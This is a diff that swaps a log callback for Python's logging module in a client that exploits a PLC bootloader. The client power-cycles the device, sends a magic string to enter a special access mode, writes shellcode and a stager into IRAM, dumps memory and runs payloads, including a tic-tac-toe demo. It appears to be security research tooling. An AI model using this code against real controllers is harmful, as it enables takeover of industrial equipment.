@@ -3,8 +3,9 @@ import struct
 import time
 import subprocess
 import binascii
+import logging
 
-from pwn import remote, context, log, xor
+from pwn import remote, context, log as pwn_log, xor
 from pymodbus.client import ModbusTcpClient
 
 context.update(log_level="info", bits=32, endian="big")
@@ -31,53 +32,50 @@ SUBPROT_80_MODE_MAGICS = [None, 0x3BC2, 0x9d26, 0xe17a, 0xc54f]
 
 
 class PlcClient:
-    def __init__(self, host, port, log_callback=print):
+    def __init__(self, host, port):
         self.host = host
         self.port = port
-        self.log_callback = log_callback
         self.r = None
         self.next_payload_location = FIRST_PAYLOAD_LOCATION
-
-    def log(self, message):
-        self.log_callback(message)
+        self.logger = logging.getLogger(__name__)
 
     def _power_cycle_http(self, ps_host, ps_port, ps_delay):
-        self.log(f"Turning off power supply via HTTP and sleeping for {ps_delay} seconds")
+        self.logger.info(f"Turning off power supply via HTTP and sleeping for {ps_delay} seconds")
         try:
             subprocess.check_call(
                 ["tools/powersupply/switch_power.py", "--port", str(ps_port), "--host", ps_host, "off"])
-            self.log("[+] Turned off power supply, sleeping")
+            self.logger.info("Turned off power supply, sleeping")
             time.sleep(ps_delay)
-            self.log("[+] Turned on power supply again")
+            self.logger.info("Turned on power supply again")
             subprocess.check_call(
                 ["tools/powersupply/switch_power.py", "--port", str(ps_port), "--host", ps_host, "on"])
-            self.log("[+] Successfully turned on power supply")
+            self.logger.info("Successfully turned on power supply")
             return True
         except (subprocess.CalledProcessError, FileNotFoundError) as e:
-            self.log(f"[!] HTTP Power switch command failed: {e}")
-            self.log("[!] Ensure 'tools/powersupply/switch_power.py' is executable.")
+            self.logger.error(f"HTTP Power switch command failed: {e}")
+            self.logger.error("Ensure 'tools/powersupply/switch_power.py' is executable.")
             return False
 
     def _power_cycle_modbus(self, ps_host, ps_port, ps_delay, modbus_slave_id, modbus_coil_addr):
-        self.log(f"Turning off power supply via Modbus and sleeping for {ps_delay} seconds")
+        self.logger.info(f"Turning off power supply via Modbus and sleeping for {ps_delay} seconds")
         try:
             client = ModbusTcpClient(ps_host, port=ps_port)
             client.connect()
 
-            self.log(f"Writing OFF to coil {modbus_coil_addr} on slave {modbus_slave_id}")
+            self.logger.info(f"Writing OFF to coil {modbus_coil_addr} on slave {modbus_slave_id}")
             client.write_coil(modbus_coil_addr, False, slave=modbus_slave_id)
 
-            self.log("[+] Turned off power supply, sleeping")
+            self.logger.info("Turned off power supply, sleeping")
             time.sleep(ps_delay)
 
-            self.log(f"Writing ON to coil {modbus_coil_addr} on slave {modbus_slave_id}")
+            self.logger.info(f"Writing ON to coil {modbus_coil_addr} on slave {modbus_slave_id}")
             client.write_coil(modbus_coil_addr, True, slave=modbus_slave_id)
 
-            self.log("[+] Successfully turned on power supply")
+            self.logger.info("Successfully turned on power supply")
             client.close()
             return True
         except Exception as e:
-            self.log(f"[!] Modbus Power switch command failed: {e}")
+            self.logger.error(f"Modbus Power switch command failed: {e}")
             return False
 
     def connect(self, switch_power=False, ps_type="HTTP Switch", **kwargs):
@@ -91,16 +89,16 @@ class PlcClient:
                     kwargs['modbus_slave_id'], kwargs['modbus_coil_addr']):
                     return False
             else:
-                self.log(f"[!] Unknown power supply type: {ps_type}")
+                self.logger.error(f"Unknown power supply type: {ps_type}")
                 return False
 
-        self.log(f"Attempting to connect to {self.host}:{self.port}...")
+        self.logger.info(f"Attempting to connect to {self.host}:{self.port}...")
         self.r = remote(self.host, self.port)
 
         magic = b"MFGT1"
         pad = b"A" * 4
 
-        self.log("Sending magic string to enter special access mode...")
+        self.logger.info("Sending magic string to enter special access mode...")
         for _ in range(100):
             self.r.send(pad + magic)
             answ = self.r.recv(256, timeout=0.3)
@@ -109,32 +107,32 @@ class PlcClient:
                     answ = self.r.recv(256) + answ
 
                 self.r.unrecv(answ)
-                self.log("[+] Got connection")
+                self.logger.info("Got connection")
                 greeting = self._recv_packet()
-                self.log(f"[+] Got special access greeting: {greeting.decode(errors='ignore')} [{binascii.hexlify(greeting).decode()}]")
+                self.logger.info(f"Got special access greeting: {greeting.decode(errors='ignore')} [{binascii.hexlify(greeting).decode()}]")
 
                 version_info = self.get_version()
-                self.log(f"[+] Got PLC bootLoader version: {version_info}")
+                self.logger.info(f"Got PLC bootLoader version: {version_info}")
 
                 return True
-        self.log("[-] Failed to get special access greeting.")
+        self.logger.warning("Failed to get special access greeting.")
         self.disconnect()
         return False
 
     def disconnect(self, continue_plc=False):
         if self.r:
-            self.log("Saying bye...")
+            self.logger.info("Saying bye...")
             try:
                 if not continue_plc:
-                    self.log("Pausing before sending bye...")
+                    self.logger.info("Pausing before sending bye...")
                     time.sleep(1)
                 self._bye()
             except Exception as e:
-                self.log(f"Error while saying bye: {e}")
+                self.logger.error(f"Error while saying bye: {e}")
             finally:
                 self.r.close()
                 self.r = None
-                self.log("Connection closed.")
+                self.logger.info("Connection closed.")
 
     def _calc_checksum_byte(self, incoming: bytes) -> bytes:
         return struct.pack("<i", -sum(incoming[:incoming[0]]))[0:1]
@@ -146,7 +144,7 @@ class PlcClient:
         msg = bytes([len(msg) + 1]) + msg
         msg += self._calc_checksum_byte(msg)
 
-        self.log(f"sending packet: {binascii.hexlify(msg).decode()}")
+        self.logger.debug(f"sending packet: {binascii.hexlify(msg).decode()}")
         for i in range(0, len(msg), step):
             time.sleep(sleep_amt)
             self.r.send(msg[i:i + step])
@@ -162,7 +160,7 @@ class PlcClient:
             answ += add
 
         if self._calc_checksum_byte(answ[:-1]) != answ[-1:]:
-            self.log(f"Checksum validity failed. Got: {answ} [{binascii.hexlify(answ).decode()}]")
+            self.logger.warning(f"Checksum validity failed. Got: {answ} [{binascii.hexlify(answ).decode()}]")
             return None
         else:
             return answ[1:-1]
@@ -173,20 +171,20 @@ class PlcClient:
             if key not in chunk and i != len(chunk) + 2:
                 encoded = key + xor(chunk, key)
                 return encoded
-        self.log(f"Could not encode chunk: {binascii.hexlify(chunk).decode()}")
+        self.logger.error(f"Could not encode chunk: {binascii.hexlify(chunk).decode()}")
         raise RuntimeError("Failed to encode chunk for stager")
 
     def _send_full_msg_via_stager(self, msg: bytes, chunk_size=2, sleep_amt=0.01):
         for i in range(0, len(msg), MAX_MSG_LEN - 1):
             time.sleep(SEND_REQ_SAFETY_SLEEP_AMT)
             chunk = msg[i:i + MAX_MSG_LEN - 1]
-            self.log(f"Send progress: 0x{i:06x}/0x{len(msg):06x} ({float(i) / float(len(msg)):.2f})")
+            self.logger.info(f"Send progress: 0x{i:06x}/0x{len(msg):06x} ({float(i) / float(len(msg)):.2f})")
             self._send_packet(self._encode_packet_for_stager(chunk), chunk_size, sleep_amt)
             answ = self._recv_packet()
             if not len(answ) == 1:
                 raise RuntimeError(f"Expecting empty ack package, got '{answ}' instead")
             if answ == b"\xff":
-                self.log("[WARNING] Interrupting the sending...")
+                self.logger.warning("Interrupting the sending...")
                 return None
         self._send_packet(self._encode_packet_for_stager(b""))
         self._recv_packet()
@@ -247,7 +245,7 @@ class PlcClient:
 
         chunk_size = 16
         for i in range(0, len(contents), chunk_size):
-            self.log(f"Writing {i:04x}/{len(contents):04x}")
+            self.logger.info(f"Writing {i:04x}/{len(contents):04x}")
             chunk = contents[i:i + chunk_size]
             self._exploit_write_chunk_to_iram(tar + i, chunk, True)
 
@@ -260,7 +258,7 @@ class PlcClient:
     def _bye(self):
         answ = self._invoke_primary_handler(0xa2)
         if answ != b"\xa2\x00":
-            self.log(f"Warning: Unexpected response to bye command: {answ}")
+            self.logger.warning(f"Unexpected response to bye command: {answ}")
 
     def _invoke_add_hook(self, add_hook_no, args=b"", await_response=True):
         assert 0 <= add_hook_no <= 0x20
@@ -278,9 +276,9 @@ class PlcClient:
     def install_stager(self, shellcode, tar_addr=IRAM_STAGER_START, add_hook_no=DEFAULT_STAGER_ADDHOOK_IND):
         assert 0 < len(shellcode) <= IRAM_STAGER_MAX_SIZE
         start_time = time.time()
-        self.log("Installing the initial stager payload...")
+        self.logger.info("Installing the initial stager payload...")
         self._install_add_hook(tar_addr, shellcode, add_hook_no)
-        self.log(f"Writing the initial stage took {time.time() - start_time:.2f} seconds")
+        self.logger.info(f"Writing the initial stage took {time.time() - start_time:.2f} seconds")
         return add_hook_no
 
     def _write_via_stager(self, tar_addr, contents, stager_add_hook_ind=DEFAULT_STAGER_ADDHOOK_IND):
@@ -289,7 +287,7 @@ class PlcClient:
 
     def install_payload_via_stager(self, payload, stager_addhook_ind):
         start_time = time.time()
-        self.log("Installing additional hook via stager...")
+        self.logger.info("Installing additional hook via stager...")
 
         add_hook_no = DEFAULT_SECOND_ADD_HOOK_IND
         tar_addr = self.next_payload_location
@@ -301,7 +299,7 @@ class PlcClient:
         if self.next_payload_location % 4 != 0:
             self.next_payload_location += 4 - (self.next_payload_location % 4)
 
-        self.log(f"Installing the additional hook took {time.time() - start_time:.2f} seconds")
+        self.logger.info(f"Installing the additional hook took {time.time() - start_time:.2f} seconds")
         return add_hook_no
 
     def dump_memory(self, address, length, dump_payload):
@@ -311,7 +309,7 @@ class PlcClient:
 
         dump_hook = self.install_payload_via_stager(dump_payload, stager_hook)
 
-        self.log(f"Dumping {length} bytes of memory from 0x{address:08x}")
+        self.logger.info(f"Dumping {length} bytes of memory from 0x{address:08x}")
         answ = self._invoke_add_hook(dump_hook, b"A" + struct.pack(">II", address, length))
 
         if not answ or not answ.startswith(b"Ok"):
@@ -325,9 +323,9 @@ class PlcClient:
                 stop = True
             else:
                 contents += next_chunk
-                self.log(f"Read {len(contents)} bytes...")
+                self.logger.info(f"Read {len(contents)} bytes...")
 
-        self.log(f"Successfully dumped {len(contents)} bytes.")
+        self.logger.info(f"Successfully dumped {len(contents)} bytes.")
         return contents
 
     def run_test_payload(self, payload):
@@ -337,9 +335,9 @@ class PlcClient:
 
         test_hook = self.install_payload_via_stager(payload, stager_hook)
 
-        self.log("Invoking test payload...")
+        self.logger.info("Invoking test payload...")
         answ = self._invoke_add_hook(test_hook)
-        self.log(f"Got answer: {answ.decode(errors='ignore')}")
+        self.logger.info(f"Got answer: {answ.decode(errors='ignore')}")
         return answ
 
     def run_tictactoe(self, payload, input_callback, output_callback):
@@ -349,7 +347,7 @@ class PlcClient:
 
         game_hook = self.install_payload_via_stager(payload, stager_hook)
 
-        self.log("[*] Starting Tic-Tac-Toe...")
+        self.logger.info("[*] Starting Tic-Tac-Toe...")
         self._invoke_add_hook(game_hook, await_response=False)
 
         msg_buffer = ""
@@ -366,4 +364,4 @@ class PlcClient:
                 choice = input_callback()
                 self._send_packet(choice.encode())
 
-        self.log("[*] Game over!")
+        self.logger.info("[*] Game over!")
